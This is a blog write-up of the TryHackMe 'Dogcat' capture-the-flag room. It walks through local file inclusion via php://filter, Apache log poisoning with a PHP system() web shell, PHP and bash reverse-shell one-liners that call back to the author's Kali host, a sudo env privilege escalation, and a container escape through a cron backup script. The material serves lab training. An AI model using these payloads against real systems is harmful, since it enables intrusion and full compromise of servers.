---
title: "[EN] - TryHackMe : DogCat writeup "
date: 2019-12-31T17:00:00+02:00
draft: false
tags: ["CTF", "THM", "TryHackMe", "DogCat", "Writeup"]
---

Hey, everybody,  
Here is my first writeup post about a CTF, and for the moment, I propose you my solution of the [Dogcat](https://tryhackme.com/room/dogcat) challenge on the TryHackMe website.

The goal of this machine is to get 4 flags, by reading the description of the machine and the twitter post of the box, we may already know that we will have to use a LFI and escape a docker container.

## Recon

When we launch the machine we can directly access it via a web browser, to make sure we are on the right page to operate, we can launch an nmap scan.

```bash
root@kali:~# nmap -sT -T5 -A 10.10.214.114
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-19 09:09 UTC
Nmap scan report for ip-10-10-214-114.eu-west-1.compute.internal (10.10.214.114)
Host is up (0.00052s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
MAC Address: 02:42:89:24:24:BC (Unknown)
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), Linux 3.8 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms ip-10-10-214-114.eu-west-1.compute.internal (10.10.214.114)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds
```

Only the port `80`  is open with an `Apache 2.4.38` web server, when you go to the web page, you can see a web page which offers to see a picture of dogs or cats.

The first interesting information that we can retrieve is the parameter, which actually suggests that a LFI is possible, and the version of `PHP` which is in `7.4.3`, an interesting information because with this version it is not possible to exploit a LFI with a null byte (`%00`) or a *path truncation*.

![](/images/2020/ctf/THM_Dogcat_Recon1.png)

The first trivial test is directly to try to load the file `/etc/passwd` :  
`http://10.10.214.114/?view=../../../../../../etc/passwd`

![](/images/2020/ctf/THM_Dogcat_Recon2.png)

But the site forces the user to use the keyword `dog` or `cat`, let's try again:

![](/images/2020/ctf/THM_Dogcat_Recon3.png)

## Exploiting LFI & First flag

Hum interesting, the error message shows that a LFI seems possible, however impossible to load the `/etc/passwd` file because the `.php` extension is automatically added, to get around that we could have used the null byte `%00` character or a path truncation but as I said, it's not possible with this version of PHP, fetching the `index.php` file to start with and see if it's possible to get additional information.

But if you try to directly load the `index.php` file via the URL `http://10.10.214.114/?view=dog../../index` you will get an error :

![](/images/2020/ctf/THM_Dogcat_Exploit1.png)

This is because the site is trying to include the `index.php` page a second time, the trick here is to use the php wrapper `php://filter` and convert the content to base64. Once recovered it is enough to decode it online or directly in your console :

![](/images/2020/ctf/THM_Dogcat_Exploit2.png)

Ok it's possible to retrieve the content of a `php` file, with a bit of guessing we can retrieve the first flag by reaching the page `flag.php` and decoding the retrieved content as for the page `index.php` via the page `http://10.10.214.114/?view=php://filter/convert.base64-encode/resource=dog../../flag`.

![](/images/2020/ctf/THM_Dogcat_Flag1.png)

## Gaining shell & flag 2

By looking for a little other file we don't find much interesting, let's resume our file `index.php`, we can see this interesting little piece of code:

![](/images/2020/ctf/THM_Dogcat_Recon4.png)

For those who are not comfortable with PHP, we can translate this as :
The `ext` parameter will be equal to the `ext` GET parameter, otherwise we'll use `.php`.
And if the GET parameter `view` contains the value `dog` or `cat` we'll look for the page that will contain the value of the GET parameter `view` and `ext` (so either the value provided in the URL or `.php` if no value is provided)

Interesting... Let's try again to load the contents of /etc/passwd by including the GET parameter `ext` and leaving it empty:

`http://10.10.214.114/?view=php://filter/resource=dog../../../../../../etc/passwd&ext=`

Ok good, we got it :

![](/images/2020/ctf/THM_Dogcat_Recon5.png)

We realize that it doesn't contain much interesting stuff, I was hoping to find a specific user in it but that's not the case, so we'll certainly have to get a shell as `wwww-data` and find a way to become `root`.

In our case, if we look for the techniques to obtain a shell with a LFI have fallen on several techniques, for those that seems exploitable in our case I retained :
* RCE via Apache log poisonning
* RCE via `/proc/self/environ`

In our case, it is not possible to load the `/proc/self/environ` file, which begins to confirm the fact that we are partitioned in a docker container.
Let's look at the first case, to succeed we need 2 things:
* Be able to access the apache log file, which is accessible via the url `http://10.10.214.114/?view=php://filter/resource=dog../../../../../../var/log/apache2/access.log&ext=`
* Inject content into it: Can be done by changing our user-agent.

*note: I found the file `/var/log/apache2/access.log` by testing the default paths where the Apache log file can be found.*

Hop, we launch burp, reload the page and intercept the request to include the payload `<?php system($_GET['cmd']);?>` in the user-agent, this will have the effect that each time we load the file `/var/log/apache2/access. log` with the GET parameter `cmd` of our command will be interpreted since the code snippet `<?php system($_GET['cmd']);?>` will be interpreted in the page since it is PHP ...

So like I said, we inject our payload:
![](/images/2020/ctf/THM_Dogcat_Exploit3.png)

Then we can use it by loading the file `/var/log/apache2/access.log` and using the GET parameter `cmd` with the value of the command we want to use :
![](/images/2020/ctf/THM_Dogcat_Exploit4.png)

To be a little more comfortable, it is possible to obtain a shell, we know that PHP is used on the machine so we will directly use a php payload to obtain a reverse-shell via the command `php -r '$sock=fsockopen("{IP_KALI}"",1234);exec("/bin/sh -i <&3 >&3 2>&3");'` such as here (don't forget to listen on the defined port) :

![](/images/2020/ctf/THM_Dogcat_Exploit5.png)

And then we get our first access on the server and we can retrieve the second flag:
![](/images/2020/ctf/THM_Dogcat_Flag2.png)

## PrivEsc & flag 3

For this task I didn't have to look for a long time, a little `sudo -l` allows me to see that a command is executable as root:
![](/images/2020/ctf/THM_Dogcat_Exploit6.png)

A simple search on [https://gtfobins.github.io/](https://gtfobins.github.io/) shows that it is possible to raise your privileges with the command `sudo env /bin/bash`, once root you get the third flag:

![](/images/2020/ctf/THM_Dogcat_Flag3.png)

## Container escape & flag 4

Ok more than the last flag, in order to validate that we are in a docker container we can use the command `hostname` which indicates a weird name that indicates a container name, we can also see the `dockerenv` file at the root, other methods allow us to confirm that we are in a container such as checking cgroups, ...

After searching quite a lot, including the different possible exploits I realized that it was a bad technique, because a lot of commands are not usable on the server (such as basic commands like `wget` etc...) which left me thinking that this was not the right track.

So I manually enumerated the machine, looking for elements that could help me escape the container such as a script via the `find / -type f -name *.sh` command, the first result is the file `/opt/backups/backup.sh`, hum interesting, looking at its contents :

![](/images/2020/ctf/THM_Dogcat_Recon6.png)

Interesting, I don't know much about docker but from what I understand, it's the root user of the host machine that makes a backup, I may be wrong but I understand that there is a `/root/backup` mount point on the host machine to the container.

As it is a backup script, we can imagine that it is executed periodically, so we can modify its contents to try to get a shell on the host machine.

So we will have to modify the `backup.sh` file with the following content :
```bash
#!/bin/bash
bash -i >& /dev/tcp/{KALI IP}/8080 0>&1
```

And tap into our Kali machine.

![](/images/2020/ctf/THM_Dogcat_Exploit7.png)

Here we go, root on the host machine, we just need to retrieve the last flag:
![](/images/2020/ctf/THM_Dogcat_Flag4.png)